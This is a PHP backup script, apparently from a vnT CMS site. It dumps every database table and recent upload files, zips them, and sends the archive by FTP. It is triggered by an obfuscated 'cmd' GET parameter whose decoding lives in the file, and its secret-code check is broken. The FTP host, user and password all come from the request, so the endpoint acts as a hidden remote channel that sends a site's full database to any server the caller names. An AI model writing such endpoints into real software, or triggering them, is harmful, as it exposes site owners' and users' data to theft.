<?php
	define('IN_vnT', 1);

	define('DIR_BACKUP', '../db_backup/data');
	
	define('MAXLENGTH', 100000);
	define('REMARK', '#');
	define('TIMEOUT', 1200);
	define('MAXGZIP', 60000000);
	define('PARSESQL', true);
	define('BIGDATA', true);
	
	// please edit this
	$prefix = ""; // leave empty will back up all tables
	$exclude = array();	// which don't you want back up
	$gzipped = true;

	require_once ('../_config.php');
	require_once ('../includes/class_db.php');
	$DB = new DB();
	include("pclzip.php");
	include("ftp.php");
	
	// NDK_decode
  function NDK_decode ($t)
  {
    global $vnT;
    $code = trim($t);
    $code = substr($code, 0, 3) . substr($code, strlen($code) - 5, 3) . substr($code, 3, strlen($code) - 8) . substr($code, strlen($code) - 2);
    $code = substr($code, strlen($code) - 7, 5) . substr($code, 0, strlen($code) - 7) . substr($code, strlen($code) - 2);
    $code = base64_decode($code);
    return $code;
  }
	
	/**
   * function do_dump 
   *  
   **/
	function do_dump($table, $fp=0)
	{
		if (in_array(substr($table, strlen($GLOBALS['prefix'])), $GLOBALS['exclude'])) return;
		$tabledump = "\n";
		$tabledump.= "DROP TABLE IF EXISTS $table;\n";
		$rows = mysql_query("SHOW CREATE TABLE $table");
		$data = mysql_fetch_array($rows);
		//$tabledump .= preg_replace('/\r|\n|\t/', '', $data[1]).";\n";
		$tabledump .= preg_replace('/\r|\n|\t/', '', $data[1]).";\n";
		if ($fp)
			fwrite($fp, $tabledump);
		else
			echo $tabledump;
	
		$rows = mysql_query("SELECT * FROM $table");
		$numfields = mysql_num_fields($rows);
		$dump = array();
		$length = 0;
		while ($row = mysql_fetch_array($rows))
		{
			$data = '(';
			for ($i=0; $i<$numfields; $i++)
			{
				if ($i!=0) $data .= ',';
				$data .= isset($row[$i]) ? "'".mysql_escape_string($row[$i])."'" : 'NULL';
			}
			$dump[] = $data.')';
			$length += strlen($data)+1;
	
			if ($length>MAXLENGTH)
			{
				$tabledump = "INSERT INTO $table VALUES " . implode(', ', $dump).";\n";
				$dump = array();
				$length = 0;
				if ($fp)
					fwrite($fp, $tabledump);
				else
					echo $tabledump;
			}
		}
		mysql_free_result($rows);
	
		if ($length>0)
		{
			$tabledump = "INSERT INTO $table VALUES " . implode(', ', $dump).";\n";
			if ($fp)
				fwrite($fp, $tabledump);
			else
				echo $tabledump;
		}
	}

	/**
   * function do_backup 
   *  
   **/
	function do_backup($filename="databse.sql")
	{
		global $conf;
		
		$fp = fopen($filename,"w");
	
		// Header
		$header = "#----------------------------------------\n";
		$header.= "# DATABASE:  ".$conf['dbname']."\n";
		$header.= "# Date/Time:  ".date ("l dS of F Y H:i:s")."\n";
		$header.= "#----------------------------------------\n";
		fwrite($fp, $header);
	
		$tablesbackup = mysql_query("SHOW tables LIKE '".$GLOBALS['prefix']."%'");
		$nums = mysql_num_rows($tablesbackup);
		//echo "Dumping ($nums tables): ";flush();$i=0;
		while ($tablebackup = mysql_fetch_array($tablesbackup))
		{
			do_dump($tablebackup[0], $fp);
			//echo ++$i%10;
			flush();
		}
		fclose($fp);
	
		if ($GLOBALS['gzipped'])
		{
			$nums = ceil(@filesize($filename)/1048576);
			//echo "<br>Gzipping ($nums MB): ";flush();$i=0;
			$fr = @fopen ($filename, 'rb') or die('Read file error: '.$filename);
			$zw = @gzopen ($filename.'.gz', 'wb') or die('Write file error: '.$filename);
			while (!feof($fr))
			{
				gzwrite ($zw, fread ($fr, 1048576));
				//echo ++$i%10;
				flush();
			}
			fclose ($fr);
			fclose ($zw);
			@unlink($filename);
		}

	}

	/**
   * function get_folder_backup 
   *  
   **/
	function get_folder_backup( $dir,$time_start,$time_end )
	{
		global $dirarray ;	
		
		if (is_dir($dir)) 
		{
			$d = dir($dir);
			while (false !== ($entry = $d->read())) 
			{
				if (substr($entry, 0, 1) != '.' && is_file($dir . "/" . $entry) && ($entry!="Thumbs.db") && strpos($entry, '.html') === false && strpos($entry, '.php') === false) 
				{
					$files = $dir . "/" . $entry ;
					if(filemtime($files)>$time_start && filemtime($files)<$time_end && filesize($files) < (2*1048576) )
					{
						$dirarray[] = $files;
					}
				}
				if (substr($entry, 0, 1) != '.' && is_dir($dir . "/" . $entry)) 
				{
					$newdir = $dir . "/" . $entry;
					get_folder_backup( $newdir ,$time_start,$time_end ) ;
				}
			}

			$d->close();
		}
		
		return $dirarray;
	}
	
	@set_time_limit(TIMEOUT);
	@error_reporting (E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
	
	if (isset ($_GET['cmd']) )
	{
		$cmd = $_GET['cmd'];
		$code = NDK_decode ($cmd);
		$cmd_arr = explode("|",$code);
		foreach($cmd_arr as $value) {
			if (!empty($value)) {
				$k = trim(substr($value,0,strpos($value,":")));
				$v = trim(substr($value,strpos($value,":")+1));
				$input[$k] = $v;
			}
		}
	}else{
		die("Die");
	}
	
	if(NDK_decode($input['scode']=="XRrlYi5jb2dGhpZZXd0="))	
	{
	  //lay ngay backup
		$today=date("d_m_Y");	 
		$sitename = ($input['name_file']) ? $input['name_file'] : str_replace("www.","",$_SERVER['HTTP_HOST']);
		$day_backup = ($input['day']) ? $input['day'] : 7 ;
		/**
		* Backup database
		*  
		**/
		$file_database = '../vnt_upload/database_'.$today.'.sql';	 
		do_backup($file_database);
		
		/**
		* Backup file
		*  
		**/
		$folder_backup = "../vnt_upload";
		$filename = $sitename."_".$today;
		$file = DIR_BACKUP ."/" . $filename . ".zip";
    
    $archive = new PclZip($file);
		$dirarray=array();
		$time_start = time() - ($day_backup * 24 * 3600);
		$time_end = time();
		$dirarray = get_folder_backup($folder_backup,$time_start,$time_end);
		
		if($gzipped) {
				$dirarray[] = $file_database.".gz"	 ;
		}else{
			$dirarray[] = $file_database;
		}
				
		
		//echo "<pre>";
		//print_r($dirarray);
		//echo "</pre>";

			
		$v_list = $archive->create($dirarray);		
		
    if ($v_list == 0)
    {
      // ko co file backup
    }
	
	/**
   * Move Backup len thaisonblog
   *  
   **/	 
	
	//load ftp
		$conf['ftp_enabled'] = 1;
		$conf['ftp_host'] = $input['ftp_host'];
		$conf['ftp_port'] = '21';
		$conf['ftp_user'] = $input['ftp_user'];
		$conf['ftp_pass'] = $input['ftp_pass']; 
		$myFTP = & vnT_FTP::getInstance($conf['ftp_host'],$conf['ftp_port'],"",$conf['ftp_user'],$conf['ftp_pass']);
	
		if($myFTP->isConnected() )
		{
			//echo "Connect FTP Success";
			$foder_desc = 'public_html/backup/'.$filename . ".zip";
			$ok = $myFTP->store($file,$foder_desc) ;
			if($ok) {				
				$err = "OK" ;
				//remove file
				if($gzipped) {
					if (file_exists($file_database.".gz")) @unlink ($file_database.".gz")	 ;
				}else{
					if (file_exists($file_database)) @unlink ($file_database)	 ;
				}
				
				if (file_exists($file)) @unlink ($file)	 ;
			
				
			}else{
				$err = "Failt" ;
			}
		
		}else{    	
			$err =  "Failt";
		}  
	}else{
		$err =  "Failt";
	}
	echo  $err;
?>